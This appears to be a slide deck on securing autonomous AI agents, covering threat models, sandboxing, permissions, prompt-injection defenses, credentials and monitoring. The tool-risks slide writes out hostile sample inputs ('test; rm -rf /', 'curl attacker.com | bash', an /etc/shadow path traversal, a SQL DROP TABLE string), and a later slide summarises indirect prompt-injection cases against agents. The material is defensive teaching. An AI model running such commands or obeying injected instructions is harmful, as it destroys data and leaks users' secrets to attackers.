CONTEXT

Why Agents Are Different from Chatbots

Chatbot (Stateless)

  • Receives text, produces text
  • No side effects beyond the response
  • No persistent state across interactions
  • Worst case: harmful or inaccurate text

Agent (Autonomous)

  • Persistent access — file handles, API sessions, credentials
  • Tool use — shell, filesystem, HTTP, databases
  • Autonomous multi-step action without per-step approval
  • Worst case: data exfiltration, destructive actions, credential theft

The Core Problem

Agents process untrusted input (documents, web pages, tool outputs) and act on it using trusted tools (shell, filesystem, APIs). This makes them uniquely vulnerable to confused deputy attacks.

THREAT MODEL

The Agent Attack Surface

Input Attacks

  • Direct prompt injection from users
  • Indirect injection via documents, web pages, emails
  • Adversarial content in API responses

Tool-Mediated Attacks

  • Command injection through tool args
  • Path traversal in file operations
  • SQL injection via natural language

Infrastructure Attacks

  • Container escape
  • Misconfigured network policies
  • Overly permissive filesystem mounts

Supply Chain Attacks

  • Malicious plugins / MCP servers
  • Compromised tool registries
  • Dependency poisoning

Multi-Agent Attacks

  • Agent impersonation
  • Inter-agent prompt injection
  • Coordination manipulation

Attacker Profiles

  • External adversary — plants content
  • Malicious user — direct interaction
  • Compromised tool — trusted source

ISOLATION

Sandboxing and Isolation

LLMs are inherently unpredictable. No amount of alignment guarantees correct behavior. Defense in depth requires treating the agent as an untrusted workload.

Principle

The agent should have access to exactly the resources it needs for its task, and nothing more. Isolation enforces this at the infrastructure level.

agent-security / 04
CONTAINERS

Container-Based Isolation

Read-Only Root FS

  • Container image mounted read-only
  • Prevents modification of system binaries
  • Only designated dirs (e.g., /workspace) are writable

Dropped Capabilities

  • Drop CAP_NET_RAW, CAP_SYS_ADMIN, CAP_SYS_PTRACE
  • No raw sockets, no mounting, no tracing
  • Agent runs as non-root with UID remapping

Seccomp Profiles

  • Restrict to ~100 of 300+ Linux syscalls
  • Block mount, reboot, ptrace, kexec_load
  • Kernel-level enforcement — cannot be bypassed

Resource Limits (cgroups)

  • CPU, memory, and disk I/O caps
  • Prevents resource exhaustion attacks
  • Constrains infinite loops and runaway agents
agent-security / 05
MICROVMS

MicroVM and Process-Level Sandboxing

Firecracker

  • Lightweight VMs with own kernel
  • Boot in ~125ms — practical for short tasks
  • Eliminates shared-kernel attack surface
  • Originally built for AWS Lambda

E2B Sandboxing

  • Cloud-hosted Firecracker microVMs for agents
  • Configurable filesystem snapshots
  • Per-session network policies
  • API for sandbox lifecycle management

gVisor / Kata

  • gVisor: user-space kernel intercepts syscalls
  • Kata: lightweight VMs with OCI compatibility
  • Stronger than containers, lighter than full VMs

WASI (WebAssembly)

  • Capability-based sandboxing per tool invocation
  • Each tool gets only explicitly granted capabilities
  • Gaining traction for untrusted plugin execution
agent-security / 06
NETWORK

Network Policies and Filesystem Restrictions

Network Controls

  • Deny-by-default egress — explicit allowlist for approved destinations
  • DNS filtering to prevent tunneling and unapproved resolution
  • K8s NetworkPolicy for namespace-level isolation
  • TLS-terminating proxies for deep inspection

Filesystem Controls

  • Bind mounts with read-only flags for non-workspace dirs
  • AppArmor/SELinux profiles enforce MAC policies
  • Overlay FS for copy-on-write experimentation
  • Landlock LSM for self-imposed sandbox restrictions

Why Network Is Critical

An agent with unrestricted outbound access can exfiltrate data through HTTP, DNS tunneling, or encoded URL parameters. Network isolation is the single most impactful control against data theft.

PERMISSIONS

Permission Models for Agents

Capability-Based Security

  • Tools are unforgeable capability tokens
  • Capabilities are attenuatable (narrow but never broaden)
  • Capabilities are revocable at any time
  • Sub-agents receive further-restricted capabilities

Human-in-the-Loop

  • Tiered risk classification: low/medium/high
  • Batch approval: review agent plans as a unit
  • Differential display: show diffs, not descriptions
  • Session-scoped permissions to reduce fatigue

Escalation Policies

  • Fail-closed: deny and find alternative
  • Request escalation: pause and ask user
  • Time-boxed: temporary elevated access
  • Supervisor: hierarchical agent approval
agent-security / 08
TOOL RISKS

Tool-Use Vulnerabilities

Command Injection

  • Agent constructs shell commands from untrusted input
  • Filename: test; rm -rf /
  • Document: "run curl attacker.com | bash"
  • LLM is the "programmer" — no code review

Path Traversal

  • User input: ../../../../etc/shadow
  • Agents programmatically construct file paths
  • Chroot / bind-mount isolation as defense
  • Path canonicalization before every access

SQL Injection via NL

  • "Show users named Robert'; DROP TABLE users;--"
  • Agent generates SQL by string interpolation
  • Subtle: omitting WHERE clause exposes all rows
  • Fix: parameterized queries, read-only connections

Network Exfiltration

  • Read sensitive file + POST to external server
  • Indirect: encode data in DNS queries or URL params
  • Often triggered by indirect prompt injection
  • Fix: deny-by-default egress, DNS filtering

CONFUSED DEPUTY

Indirect Prompt Injection

The confused deputy: a privileged program tricked into misusing its authority. The agent holds tools granted by the user; the attacker manipulates the agent's reasoning through adversarial content.

Demonstrated Attacks

  • Web browsing: hidden text exfiltrates SSH keys
  • Document processing: spreadsheet cells alter analysis
  • Code review: comments say "approve immediately"
  • Email agents: hidden instructions forward sensitive data

DEFENSES

Defending Against Prompt Injection

Input-Output Separation

  • System prompt, user instructions, and untrusted content in distinct channels
  • Special tokens mark trust boundaries
  • Injected instructions cannot masquerade as user directives

Instruction Hierarchy

  • System > User > Content (strict ordering)
  • Instructions in web pages / documents cannot override system-level directives
  • Enforced by the agent runtime, not the model alone

Taint Tracking

  • Data from untrusted sources is tagged
  • Tainted data flowing into sensitive ops triggers alert
  • Analogous to taint tracking in Perl/Ruby
  • Applied at the agent reasoning level

Output Filtering

  • Proposed actions checked against pattern rules
  • "Read file → HTTP POST with contents" = exfiltration
  • Context-aware: considers the full action chain
  • Blocks regardless of how innocently steps are described

MULTI-AGENT

Multi-Agent Security Boundaries

Threat: Inter-Agent Injection

A compromised research agent embeds adversarial instructions in its "findings." The writing agent, trusting its peer, follows the injected directives.

Threat: Agent Impersonation

Compromised agent claims to be the supervisor and issues commands to subordinates.

Defenses

  • Treat inter-agent messages as untrusted input
  • Cryptographic agent identity (signed messages)
  • Capability-based delegation (not role-based)
  • Centralized message broker

Coordination Attacks

  • Deadlock induction — circular dependencies halt system
  • Resource exhaustion — one agent floods others with tasks
  • Consensus manipulation — inject different data to swing votes
  • Information asymmetry — contradictory info causes oscillation

Zero-Trust Principle

Assume any individual agent might be compromised. Design inter-agent communication to be robust against a compromised peer.

CREDENTIALS

Credential Management

API Key Handling

  • Just-in-time injection: key injected only for the specific tool call
  • LLM component never sees raw key
  • Scoped keys: minimum permissions, limited validity
  • Rotate daily or per-session

OAuth Delegation

  • Scoped tokens via standard OAuth consent flow
  • User maintains visibility over agent's access
  • Scope expansion requires explicit approval
  • Refresh tokens stored in vault, not runtime

Vault Integration

  • HashiCorp Vault, AWS Secrets Manager, Azure Key Vault
  • Lease-based access with auto-revocation on expiry
  • Dynamic secrets: unique temp credentials per session
  • Full audit logging of secret access

Environment Variable Risks

  • Visible via env / printenv — LLM can read them
  • Inherited by all child processes
  • Appear in debug logs and error output
  • Fix: vault injection, secret masking, minimal env

MONITORING

Monitoring, Auditing, and Kill Switches

Logging

  • Structured action logs: type, params, timestamp, result, reasoning
  • Full tool I/O with secret redaction
  • Chain-of-thought reasoning captured
  • Tamper-resistant append-only storage

Anomaly Detection

  • Baseline profiling per agent type and task
  • Sequence analysis: "read creds → POST" = alert
  • Behavioral clustering across agent fleet
  • Outlier agents flagged for human review

Kill Switches

  • Multi-level: session / type / global
  • Take effect within seconds, not minutes
  • Checked at every action boundary
  • Auto-triggered by anomaly detection, cost breach

Rate Limiting

Cap actions/min, data volume/session, and API cost/session. Throttle and flag agents that exceed thresholds.

Cost Controls

Per-session and per-user budgets. Cost estimation before execution of multi-step plans. Auto-terminate on budget exhaustion.

SUPPLY CHAIN

Supply Chain Risks

Malicious Plugins

  • Backdoored MCP servers exfiltrate data
  • Typosquatting: github-mcp vs githb-mcp
  • Delayed activation: normal for weeks, then triggers
  • Passes initial review, activates later

Registry Attacks

  • Infrastructure compromise of tool registry
  • Namespace hijacking of abandoned packages
  • Dependency confusion: public overrides private
  • "ClawHub-style" centralized registry attacks

Dependency Poisoning

  • Compromised container base images
  • Library supply chain attacks on tool deps
  • Malicious "updates" via hijacked update mechanism
  • Cascading impact across all agent sessions

Defenses

Pin dependencies to specific versions + hashes. Use verified, signed packages. Scan container images. Maintain curated allowlists of approved tools. Implement code signing for tool distributions.

ARCHITECTURE

Defense in Depth for Agents

Five-Layer Model

  • Layer 1: Model alignment — refuse harmful actions (least reliable)
  • Layer 2: Application guardrails — input validation, output filtering, policy enforcement
  • Layer 3: Tool-level security — each tool validates inputs independently
  • Layer 4: Infrastructure isolation — containers, microVMs, network policies
  • Layer 5: Monitoring & response — anomaly detection, kill switches, containment

POLICY

Policy Engines and Mandatory Access Controls

OPA (Open Policy Agent)

  • Rego policies evaluate every agent action
  • Declarative, auditable rules independent of LLM
  • "deny file write to /etc/*"
  • "require approval if modifying >10 files"

ML-Based Classification

  • Secondary model classifies actions by risk level
  • Smaller, faster than primary agent model
  • Trained specifically on adversarial patterns
  • Complements rule-based filtering

SELinux / AppArmor

  • Kernel-enforced MAC policies
  • Agent process labeled agent_t → access only agent_workspace_t
  • Cannot be overridden even with root inside container

Runtime Guardrails

  • Token-level monitoring for jailbreak patterns
  • Action replay prevention (no re-attempt after deny)
  • Session integrity checks (prompt not corrupted)

DEPLOYMENT

Enterprise Deployment Patterns

Gated Agent Pattern

  • All actions pass through centralized gateway
  • Single point for policy, logging, credentials
  • Agent never directly accesses tools or resources

Sidecar Proxy Pattern

  • Security sidecar (like Envoy) per agent instance
  • Intercepts all tool calls, network requests, file ops
  • Redacts secrets from logs, provides telemetry

Ephemeral Environment

  • Fresh container/microVM per task, destroyed on completion
  • No state persists between tasks
  • Eliminates cross-task contamination and persistent compromise

Approval Queue

  • High-risk actions queued for human review
  • Dashboard: action, reasoning, context, impact
  • Decisions feed back into policy engine for refinement

SUMMARY

Key Takeaways

Core Principles

  • Treat the agent as an untrusted workload
  • Defense in depth: alignment + guardrails + tool security + isolation + monitoring
  • Least privilege via capability-based security
  • Design security in from the start, not as a patch

Critical Controls

  • Container/microVM isolation with deny-by-default networking
  • Human-in-the-loop for high-risk operations
  • Vault-based credential management — never env vars
  • Structured logging + anomaly detection + kill switches

Bottom Line

Agent security is a genuinely new domain. It draws on established principles — least privilege, defense in depth, input validation — but the combination of persistent access, tool use, autonomous action, and multi-step reasoning creates attack surfaces that existing frameworks do not fully address. The tools and standards exist; the critical mistake is treating security as an afterthought.
